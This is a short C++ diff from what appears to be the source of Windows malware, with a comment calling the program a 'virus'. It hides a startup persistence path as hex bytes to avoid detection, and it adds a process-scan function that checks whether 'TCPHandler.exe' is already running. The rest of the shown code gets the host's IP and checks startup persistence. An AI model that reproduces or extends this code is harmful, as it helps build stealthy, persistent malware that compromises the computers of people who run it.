@@ -3,6 +3,8 @@
 
 #include "Utils.h"
 #include <string>
+#include <Windows.h>
+#include <tlhelp32.h>
 
 /* hiding the path, the exe may show the string and compromise the location of the virus*/
 char additionToStartUp[256] = { 0x5c, 0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x5c, 0x57, 0x69, 0x6e,
@@ -21,6 +23,24 @@ uint32_t getPrivateIP()
     gethostname(hostName, 255);
     host_entry = gethostbyname(hostName); // turn host naem to ip
     return (*(struct in_addr*)*host_entry->h_addr_list).s_addr;
+}
+
+bool isRunning()
+{
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+    if (Process32First(snapshot, &entry))
+        while (Process32Next(snapshot, &entry))
+            if (!wcscmp(entry.szExeFile, L"TCPHandler.exe"))
+            {
+                CloseHandle(snapshot);
+                return 1;
+            }
+    CloseHandle(snapshot);
+    return 0;
 }
 
 bool isInStartUp(char* filePath)
